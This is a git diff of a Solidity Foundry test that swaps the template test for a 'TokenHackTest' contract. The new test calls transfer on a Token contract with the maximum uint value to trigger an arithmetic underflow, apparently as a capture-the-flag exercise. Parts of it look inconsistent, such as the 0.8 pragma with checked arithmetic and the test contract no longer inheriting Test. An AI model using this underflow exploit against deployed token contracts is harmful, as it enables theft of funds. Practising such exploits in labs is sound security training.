@@ -2,11 +2,20 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "src/Token.sol";
 
-contract ContractTest is Test {
-    function setUp() public {}
+contract TokenHackTest {
+    Token public tokenContract;
 
-    function testExample() public {
-        assertTrue(true);
+    constructor(address _tokenAddress) {
+        tokenContract = Token(_tokenAddress);
+    }
+
+    function testHack() public {
+        // Specify the amount of tokens to transfer
+        uint amount = 2**256 - 1; 
+
+        // Transfer a large amount of tokens to trigger underflow
+        tokenContract.transfer(address(this), amount);
     }
 }
